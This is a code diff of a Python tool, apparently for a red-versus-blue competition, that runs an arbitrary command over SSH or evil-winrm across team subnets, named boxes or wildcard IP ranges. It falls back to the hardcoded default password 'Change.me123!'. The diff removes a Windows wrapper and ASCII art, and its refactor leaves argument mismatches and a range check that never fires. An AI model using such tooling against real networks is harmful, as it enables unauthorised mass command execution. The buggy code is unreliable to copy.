@@ -34,47 +34,8 @@ def single_connection_command(hostname_in,username_in,password_in,command_in,os)
 
 
 
-def single_connection_command_windows(hostname_in, username_in, password_in, command_in,
-                                      connect_timeout=5, operation_timeout=30,
-                                      transport='ntlm', server_cert_validation='ignore'
-                                     ) -> Tuple[bool, Dict]:
-    """
-    Execute evil-winrm via os.system (shell). Minimal, for local/lab use.
-    - command output prints directly to the terminal (no capture).
-    - uses shlex.quote to safely embed inputs in the shell command.
-    - returns (success_bool, info_dict).
-    """
-    # check evil-winrm exists
-    if shutil.which("evil-winrm") is None:
-        print("[FAILURE] evil-winrm not found in PATH")
-        return False, {"reason": "missing_executable"}
-
-    # build shell command with quoted fields
-    cmd = (
-        "evil-winrm -i " + shlex.quote(hostname_in) +
-        " -u " + shlex.quote(username_in) +
-        " -p " + shlex.quote(password_in) +
-        " -c " + shlex.quote(command_in)
-    )
-
-    # run the command; output goes straight to the terminal
-    status = os.system(cmd)
-
-    # normalize exit code on POSIX
-    try:
-        if os.WIFEXITED(status):
-            exit_code = os.WEXITSTATUS(status)
-        else:
-            exit_code = status
-    except AttributeError:
-        # non-POSIX (unlikely here), use raw status
-        exit_code = status
-
-    if exit_code == 0:
-        return True, {"returncode": exit_code}
-    else:
-        print(f"[FAILURE] evil-winrm failed for {hostname_in} (rc={exit_code})")
-        return False, {"reason": "nonzero_return", "returncode": exit_code}
+def single_connection_command_windows(hostname_in, username_in, password_in, command_in):
+    pass
 
 def single_connection_command_linux(hostname_in,username_in,password_in,command_in):
     try:
@@ -102,7 +63,8 @@ def make_target_list(ip_string, variable_list): # pass it a string to be modifie
     return to_return
 
 #RUNS THE MINIONS, also does the OS switch
-def run_multiple_multithread(ip_list,username,password,command,os):
+def run_multiple_multithread(ip_list,values_tuple):
+    username,password,command,os=values_tuple
     if (os == "L" or os == "LINUX"):
         with ThreadPoolExecutor(max_workers=WORKERS) as executor:
             for ip in ip_list:
@@ -114,53 +76,24 @@ def run_multiple_multithread(ip_list,username,password,command,os):
             
 
 #ATTACK FUNCTIONS
-def team_attack(teamnumber,username,password,command,os):
+def team_attack(teamnumber,values_tuple):
     targets=make_target_list("192.168."+str(teamnumber)+".x",[1,2])
     targets2=make_target_list("10."+str(teamnumber)+".1."+'x',[4,5,6])
     targets=targets+targets2
-    run_multiple_multithread(targets,username,password,command,os)
+    run_multiple_multithread(targets,values_tuple)
 
-def box_attack(box_hostname,username,password,command,os):
+def box_attack(box_hostname,values_tuple):
     targets=list()
     if HOSTNAME_DICT[box_hostname] <3:
         targets=make_target_list("192.168.x."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
     else:
         targets=make_target_list("10.x.1."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
-    run_multiple_multithread(targets,username,password,command,os)
+    run_multiple_multithread(targets,values_tuple)
         
-def all_attack(username,password,command,os):
+def all_attack(values_tuple):
     for key in HOSTNAME_DICT:
-        box_attack(key,username,password,command,os)
+        box_attack(key,values_tuple)
 
-
-left = r"""
-           /^\/^\
-         _|__|  O|
-\/     /~     \_/ \
- \____|__________/  \
-        \_______      \
-                `\     \                 \
-                  |     |                  \
-                 /      /                    \
-                /     /                       \\
-              /      /                         \ \
-             /     /                            \  \
-           /     /             _----_            \   \
-          /     /           _-~      ~-_         |   |
-         (      (        _-~    _--_    ~-_     _/   |
-          \      ~-____-~    _-~    ~-_    ~-_-~    /
-            ~-_           _-~          ~-_       _-~
-               ~--______-~                ~-___-~
-"""
-
-right = r"""
-   ____              _           ____ _                                    
-  / ___| _ __   __ _| | _____   / ___| |__   __ _ _ __ _ __ ___   ___ _ __ 
-  \___ \| '_ \ / _` | |/ / _ \ | |   | '_ \ / _` | '__| '_ ` _ \ / _ \ '__|
-   ___) | | | | (_| |   <  __/ | |___| | | | (_| | |  | | | | | |  __/ |   
-  |____/|_| |_|\__,_|_|\_\___|  \____|_| |_|\__,_|_|  |_| |_| |_|\___|_|   
-                                                                           
-"""
 
 def print_side_by_side(a: str, b: str, gap: int = 4):
     # remove incidental indentation, keep backslashes literal using raw strings above
@@ -180,7 +113,7 @@ def print_side_by_side(a: str, b: str, gap: int = 4):
 # print them
 
 
-def expand_wildcards(ip_template,username,password,command,os): #pos 2: wildcard_dict,
+def expand_wildcards(ip_template,values_tuple): #pos 2: wildcard_dict,
 
     parts = ip_template.split('.')
     ranges = []
@@ -204,7 +137,7 @@ def expand_wildcards(ip_template,username,password,command,os): #pos 2: wildcard
 
     backtrack()
     # print(expanded_ips)
-    run_multiple_multithread(expanded_ips,username,password,command,os)
+    run_multiple_multithread(expanded_ips,values_tuple)
     
     
 
@@ -212,23 +145,24 @@ def expand_wildcards(ip_template,username,password,command,os): #pos 2: wildcard
   
 #CLI
 def cli_interface():
-
-    print_side_by_side(left, right, gap=6)
-
     username=input("Target user: ")
     password=input("Target Password (leave blank for default): ")
+    
     if password=="":
         password="Change.me123!"
+
     print("Using credentials ",username,":",password,sep="")
+
     command=input("\nCommand to run: ")
-    # os=input("Linux or Windows: ").upper()
-    os="LINUX"#WINDOWS DOESNT WORK HAND CODE LINUX
+    os=input("Linux or Windows: ").upper()
+    values_tuple=username,password,command,os
+
     if os not in ["LINUX","L","WINDOWS","W"]:
-        print("invalid answer!")
-        quit()
+        print("Defaulting to linux")
+        os="LINUX"
 
     targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP Address range (192.168.2,1-18, 10.1-4.3.10-18)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl, etc')\n-All ('All')\nInput: ").upper()
-    box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
+    # HOSTNAME_DICT=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
 
     if "TEAM" in targets_input:
         if targets_input[-2:-1]=="1":
@@ -238,20 +172,18 @@ def cli_interface():
         if (int(teamnum)>19 and int(teamnum)<0):
             raise IndexError("Team number is not between 1 and 18")
         
-        team_attack(teamnum,username,password,command,os)
+        team_attack(teamnum,values_tuple)
 
-    elif any(box in targets_input for box in box_targets):
-        box_attack(targets_input,username,password,command,os)
-    elif "ALL" in targets_input:
-        all_attack(username,password,command,os)
-    elif "-" in targets_input:
-        expand_wildcards(targets_input,username,password,command,os)
-
-    elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":
-        single_connection_command(targets_input,username,password,command,os) 
-
-    else:
-        print("No matching entries!!")
+#hostname of box attack
+    elif any(box in targets_input for box in HOSTNAME_DICT):box_attack(targets_input,values_tuple)
+#all attack
+    elif "ALL" in targets_input:all_attack(values_tuple)
+#wildcard attack
+    elif "-" in targets_input:expand_wildcards(targets_input,values_tuple)
+#single ip or localhost
+    elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":single_connection_command(targets_input,values_tuple) 
+#failed to match
+    else:print("No matching entries!!")
 
         
 def main():
@@ -259,6 +191,7 @@ def main():
 
 if __name__=="__main__":
     main()
+
 
 
 '''
@@ -289,7 +222,7 @@ def wildcard(input,ip_dict,username,password,command,):
         print("Using credentials ",username,":",password,sep="")
         command=input("\nCommand to run: ")
         targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP address range (192.168.1-10.5, 10.1.3-9.4-33)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
-        box_targets=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
+        HOSTNAME_DICT=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
         if "TEAM" in targets_input:
             if targets_input[-2:-1]=="1":
                 teamnum=targets_input[-2:]
@@ -299,7 +232,7 @@ def wildcard(input,ip_dict,username,password,command,):
                 raise IndexError("Team number is not between 1 and 18")
             team_attack_windows(teamnum,username,password,command)
 
-        elif any(box in targets_input for box in box_targets):
+        elif any(box in targets_input for box in HOSTNAME_DICT):
             box_attack_windows(targets_input,username,password,command)
         elif "ALL" in targets_input:
             all_attack_windows(username,password,command)
